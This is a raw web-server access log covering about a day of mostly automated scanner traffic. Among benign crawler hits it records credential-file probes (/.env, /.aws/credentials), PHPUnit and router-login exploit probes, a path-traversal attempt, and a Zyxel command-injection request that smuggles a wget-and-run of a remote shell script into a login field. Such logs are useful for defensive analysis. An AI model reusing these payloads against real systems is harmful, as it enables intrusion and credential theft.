193.56.29.192 - - [02/Feb/2023:15:09:19 -0600] "GET /.env HTTP/1.1" 301 245 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
193.56.29.192 - - [02/Feb/2023:15:09:19 -0600] "POST / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
193.56.29.192 - - [02/Feb/2023:15:09:22 -0600] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 291 "-" "python-requests/2.25.1"
193.32.162.159 - - [02/Feb/2023:15:27:12 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
3.249.190.82 - - [02/Feb/2023:15:41:35 -0600] "HEAD /icons/apache_pb.gif HTTP/1.0" 301 - "-" "Mozilla/5.0 (compatible; NetcraftSurveyAgent/1.0; +info@netcraft.com)"
143.110.222.166 - - [02/Feb/2023:16:05:13 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
179.43.177.242 - - [02/Feb/2023:16:08:28 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 264 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
23.251.102.82 - - [02/Feb/2023:16:21:40 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
143.110.222.166 - - [02/Feb/2023:17:08:20 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
179.43.177.242 - - [02/Feb/2023:17:33:44 -0600] "GET / HTTP/1.1" 301 241 "-" "Hello World"
185.180.143.79 - - [02/Feb/2023:17:44:24 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.180.143.79 - - [02/Feb/2023:17:44:24 -0600] "HEAD /icons/sphere1.png HTTP/1.1" 301 - "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.180.143.79 - - [02/Feb/2023:17:44:24 -0600] "HEAD /icons/.%%32%65/.%%32%65/apache2/icons/non-existant-image.png HTTP/1.1" 400 - "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
193.32.162.159 - - [02/Feb/2023:17:45:02 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
143.110.222.166 - - [02/Feb/2023:18:06:11 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
184.105.139.68 - - [02/Feb/2023:18:45:52 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:106.0) Gecko/20100101 Firefox/106.0"
184.105.139.68 - - [02/Feb/2023:18:46:38 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0"
184.105.139.68 - - [02/Feb/2023:18:47:02 -0600] "GET /favicon.ico HTTP/1.1" 301 252 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36"
198.199.115.80 - - [02/Feb/2023:19:04:26 -0600] "GET /druid/index.html HTTP/1.1" 301 257 "-" "Mozilla/5.0 zgrab/0.x"
143.110.222.166 - - [02/Feb/2023:19:07:31 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
193.32.162.159 - - [02/Feb/2023:19:13:06 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
109.237.97.180 - - [02/Feb/2023:19:47:54 -0600] "GET /.env HTTP/1.1" 301 245 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [02/Feb/2023:19:47:54 -0600] "\x16\x03\x01\x01H\x01" 400 226 "-" "-"
109.237.97.180 - - [02/Feb/2023:19:47:55 -0600] "POST /.env HTTP/1.1" 301 245 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [02/Feb/2023:19:47:55 -0600] "GET /.aws/credentials HTTP/1.1" 301 257 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [02/Feb/2023:19:47:55 -0600] "POST /.aws/credentials HTTP/1.1" 301 257 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [02/Feb/2023:19:47:56 -0600] "GET /.aws/config HTTP/1.1" 301 252 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [02/Feb/2023:19:47:56 -0600] "POST /.aws/config HTTP/1.1" 301 252 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [02/Feb/2023:19:47:56 -0600] "GET /aws/credentials HTTP/1.1" 301 256 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [02/Feb/2023:19:47:56 -0600] "POST /aws/credentials HTTP/1.1" 301 256 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [02/Feb/2023:19:47:57 -0600] "GET /credentials HTTP/1.1" 301 252 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [02/Feb/2023:19:47:57 -0600] "POST /credentials HTTP/1.1" 301 252 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [02/Feb/2023:19:47:57 -0600] "GET /test.php HTTP/1.1" 301 249 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [02/Feb/2023:19:47:58 -0600] "POST /test.php HTTP/1.1" 301 249 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [02/Feb/2023:19:47:58 -0600] "GET /laravel/.env HTTP/1.1" 301 253 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [02/Feb/2023:19:47:58 -0600] "POST /laravel/.env HTTP/1.1" 301 253 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [02/Feb/2023:19:47:59 -0600] "GET /demo/.env HTTP/1.1" 301 250 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [02/Feb/2023:19:47:59 -0600] "POST /demo/.env HTTP/1.1" 301 250 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [02/Feb/2023:19:47:59 -0600] "GET /web/.env HTTP/1.1" 301 249 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [02/Feb/2023:19:48:00 -0600] "POST /web/.env HTTP/1.1" 301 249 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [02/Feb/2023:19:48:00 -0600] "GET /phpinfo HTTP/1.1" 301 248 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [02/Feb/2023:19:48:00 -0600] "POST /phpinfo HTTP/1.1" 301 248 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
143.110.222.166 - - [02/Feb/2023:20:05:36 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
193.32.162.159 - - [02/Feb/2023:20:30:15 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
194.165.16.72 - - [02/Feb/2023:21:01:57 -0600] "\x03" 400 226 "-" "-"
194.165.16.72 - - [02/Feb/2023:21:01:57 -0600] "\x03" 400 226 "-" "-"
143.110.222.166 - - [02/Feb/2023:21:08:49 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
5.78.72.246 - - [02/Feb/2023:21:17:24 -0600] "GET /wp-login.php HTTP/1.1" 301 253 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763"
193.32.162.159 - - [02/Feb/2023:21:24:24 -0600] "GET /adv,/cgi-bin/weblogin.cgi?username=admin%27%3Bcd%20/tmp;wget%20http://45.12.253.12/wget.sh%20-O-%20>s;chmod%20777%20s;sh%20s%20load.zyxel;+%23&password=asdf HTTP/1.1" 301 404 "-" "Mozila/5.0"
193.32.162.159 - - [02/Feb/2023:21:24:25 -0600] "GET / HTTP/1.1" 301 241 "-" "-"
193.32.162.159 - - [02/Feb/2023:21:24:25 -0600] "POST / HTTP/1.1" 301 241 "http://194.195.210.97:80/" "Mozilla/5.0"
183.136.225.32 - - [02/Feb/2023:21:44:57 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
183.136.225.32 - - [02/Feb/2023:21:45:27 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
183.136.225.32 - - [02/Feb/2023:21:45:48 -0600] "GET /favicon.ico HTTP/1.1" 301 252 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
183.136.225.32 - - [02/Feb/2023:21:46:28 -0600] "GET /robots.txt HTTP/1.1" 301 251 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
143.110.222.166 - - [02/Feb/2023:22:07:19 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
174.138.42.180 - - [02/Feb/2023:22:53:16 -0600] "GET /.env HTTP/1.1" 301 245 "-" "python-requests/2.28.2"
34.77.127.183 - - [02/Feb/2023:22:58:49 -0600] "GET / HTTP/1.1" 301 241 "-" "python-requests/2.28.2"
193.32.162.159 - - [02/Feb/2023:23:08:01 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
143.110.222.166 - - [02/Feb/2023:23:08:56 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
179.60.147.3 - - [02/Feb/2023:23:15:39 -0600] "\x03" 400 226 "-" "-"
179.60.147.3 - - [02/Feb/2023:23:15:39 -0600] "\x03" 400 226 "-" "-"
179.60.147.3 - - [02/Feb/2023:23:15:39 -0600] "\x03" 400 226 "-" "-"
179.43.177.242 - - [02/Feb/2023:23:44:15 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 264 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
185.246.220.98 - - [02/Feb/2023:23:57:14 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
192.241.235.9 - - [02/Feb/2023:23:59:31 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 zgrab/0.x"
143.110.222.166 - - [03/Feb/2023:00:09:54 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
2001:470:1:332::14a - - [03/Feb/2023:01:00:07 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
143.110.222.166 - - [03/Feb/2023:01:05:46 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
2001:470:1:332::149 - - [03/Feb/2023:01:08:13 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0"
2001:470:1:332::14c - - [03/Feb/2023:01:08:18 -0600] "GET /favicon.ico HTTP/1.1" 301 252 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edg/106.0.1370.37"
137.184.98.239 - - [03/Feb/2023:01:33:26 -0600] "GET /.env HTTP/1.1" 301 245 "-" "Python/3.11 aiohttp/3.8.3"
179.60.147.3 - - [03/Feb/2023:01:33:31 -0600] "\x03" 400 226 "-" "-"
179.60.147.3 - - [03/Feb/2023:01:33:32 -0600] "\x03" 400 226 "-" "-"
179.60.147.3 - - [03/Feb/2023:01:33:32 -0600] "\x03" 400 226 "-" "-"
179.43.177.242 - - [03/Feb/2023:01:42:52 -0600] "GET / HTTP/1.1" 301 241 "-" "Hello World"
178.128.193.7 - - [03/Feb/2023:01:43:21 -0600] "GET / HTTP/1.1" 301 241 "-" "Hello World"
193.32.162.159 - - [03/Feb/2023:01:53:16 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
205.210.31.19 - - [03/Feb/2023:02:00:43 -0600] "GET / HTTP/1.0" 301 241 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
185.224.128.219 - - [03/Feb/2023:02:00:44 -0600] "GET /admin/config.php HTTP/1.1" 301 257 "-" "python-requests/2.22.0"
143.110.222.166 - - [03/Feb/2023:02:08:35 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
145.255.72.10 - - [03/Feb/2023:02:47:36 -0600] "GET /vendor/.env HTTP/1.1" 301 252 "-" "-"
145.255.72.10 - - [03/Feb/2023:02:47:36 -0600] "GET /admin/.env HTTP/1.1" 301 251 "-" "-"
185.224.128.219 - - [03/Feb/2023:02:57:46 -0600] "GET /admin/config.php HTTP/1.1" 301 257 "-" "python-requests/2.22.0"
154.6.12.47 - - [03/Feb/2023:03:01:37 -0600] "GET /.env HTTP/1.1" 301 245 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
154.6.12.47 - - [03/Feb/2023:03:01:38 -0600] "POST / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
154.6.12.47 - - [03/Feb/2023:03:01:38 -0600] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 291 "-" "python-requests/2.25.1"
143.110.222.166 - - [03/Feb/2023:03:03:29 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
113.142.141.105 - - [03/Feb/2023:03:10:53 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
193.32.162.159 - - [03/Feb/2023:03:22:09 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
198.199.92.127 - - [03/Feb/2023:03:26:37 -0600] "MGLNDD_194.195.210.97_80\n" 400 226 "-" "-"
173.249.56.171 - - [03/Feb/2023:03:44:57 -0600] "GET /wp-includes/css/buttons.css HTTP/1.1" 301 268 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36"
179.60.147.3 - - [03/Feb/2023:04:00:16 -0600] "\x03" 400 226 "-" "-"
179.60.147.3 - - [03/Feb/2023:04:00:16 -0600] "\x03" 400 226 "-" "-"
179.60.147.3 - - [03/Feb/2023:04:00:17 -0600] "\x03" 400 226 "-" "-"
81.161.229.94 - - [03/Feb/2023:04:00:41 -0600] "GET /config/getuser?index=0 HTTP/1.1" 301 263 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
143.110.222.166 - - [03/Feb/2023:04:03:13 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
194.87.151.116 - - [03/Feb/2023:04:16:00 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 264 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
54.37.204.35 - - [03/Feb/2023:04:19:18 -0600] "GET / HTTP/1.1" 301 241 "-" "2ip bot/1.1 (+http://2ip.io)"
54.37.204.35 - - [03/Feb/2023:04:19:25 -0600] "GET / HTTP/1.1" 301 241 "-" "2ip bot/1.1 (+http://2ip.io)"
54.37.204.35 - - [03/Feb/2023:04:19:35 -0600] "GET / HTTP/1.1" 301 241 "-" "2ip bot/1.1 (+http://2ip.io)"
143.198.201.142 - - [03/Feb/2023:04:26:07 -0600] "GET / HTTP/1.0" 301 241 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:98.0) Gecko/20100101 Firefox/98.0"
143.110.222.166 - - [03/Feb/2023:05:08:20 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
143.110.222.166 - - [03/Feb/2023:06:05:58 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
109.237.98.226 - - [03/Feb/2023:06:42:38 -0600] "GET /.env HTTP/1.1" 301 245 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.226 - - [03/Feb/2023:06:42:38 -0600] "\x16\x03\x01\x01H\x01" 400 226 "-" "-"
109.237.98.226 - - [03/Feb/2023:06:42:39 -0600] "POST /.env HTTP/1.1" 301 245 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.226 - - [03/Feb/2023:06:42:39 -0600] "GET /.aws/credentials HTTP/1.1" 301 257 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.226 - - [03/Feb/2023:06:42:39 -0600] "POST /.aws/credentials HTTP/1.1" 301 257 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.226 - - [03/Feb/2023:06:42:40 -0600] "GET /.aws/config HTTP/1.1" 301 252 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.226 - - [03/Feb/2023:06:42:40 -0600] "POST /.aws/config HTTP/1.1" 301 252 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.226 - - [03/Feb/2023:06:42:40 -0600] "GET /aws/credentials HTTP/1.1" 301 256 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.226 - - [03/Feb/2023:06:42:40 -0600] "POST /aws/credentials HTTP/1.1" 301 256 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.226 - - [03/Feb/2023:06:42:41 -0600] "GET /credentials HTTP/1.1" 301 252 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.226 - - [03/Feb/2023:06:42:41 -0600] "POST /credentials HTTP/1.1" 301 252 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.226 - - [03/Feb/2023:06:42:41 -0600] "GET /test.php HTTP/1.1" 301 249 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.226 - - [03/Feb/2023:06:42:42 -0600] "POST /test.php HTTP/1.1" 301 249 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.226 - - [03/Feb/2023:06:42:42 -0600] "GET /laravel/.env HTTP/1.1" 301 253 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.226 - - [03/Feb/2023:06:42:42 -0600] "POST /laravel/.env HTTP/1.1" 301 253 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.226 - - [03/Feb/2023:06:42:42 -0600] "GET /demo/.env HTTP/1.1" 301 250 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.226 - - [03/Feb/2023:06:42:43 -0600] "POST /demo/.env HTTP/1.1" 301 250 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.226 - - [03/Feb/2023:06:42:43 -0600] "GET /web/.env HTTP/1.1" 301 249 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.226 - - [03/Feb/2023:06:42:43 -0600] "POST /web/.env HTTP/1.1" 301 249 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.226 - - [03/Feb/2023:06:42:44 -0600] "GET /phpinfo HTTP/1.1" 301 248 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.226 - - [03/Feb/2023:06:42:44 -0600] "POST /phpinfo HTTP/1.1" 301 248 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
193.32.162.159 - - [03/Feb/2023:06:52:58 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
179.43.177.242 - - [03/Feb/2023:06:59:59 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 264 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
143.110.222.166 - - [03/Feb/2023:07:03:17 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
94.102.61.10 - - [03/Feb/2023:07:45:21 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
161.35.7.81 - - [03/Feb/2023:07:50:23 -0600] "\x16\x03\x01" 400 226 "-" "-"
161.35.7.81 - - [03/Feb/2023:07:50:23 -0600] "\x16\x03\x01" 400 226 "-" "-"
161.35.7.81 - - [03/Feb/2023:07:50:23 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
